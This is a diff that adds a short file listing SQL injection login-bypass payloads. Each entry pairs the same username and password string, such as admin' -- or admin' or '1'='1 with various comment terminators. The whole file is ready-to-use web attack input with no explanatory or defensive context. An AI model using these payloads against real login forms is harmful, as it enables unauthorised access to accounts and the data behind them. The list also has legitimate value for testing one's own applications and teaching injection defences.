@@ -1,0 +1,17 @@
+username : admin' --
+password : admin' --
+
+username : admin'/*
+password : admin'/*
+
+username : admin' or '1'='1
+password : admin' or '1'='1
+
+username : admin' or '1'='1'--
+password : admin' or '1'='1'--
+
+username : admin' or '1'='1'#
+password : admin' or '1'='1'#
+
+username : admin' or '1'='1'/*
+password : admin' or '1'='1'/*
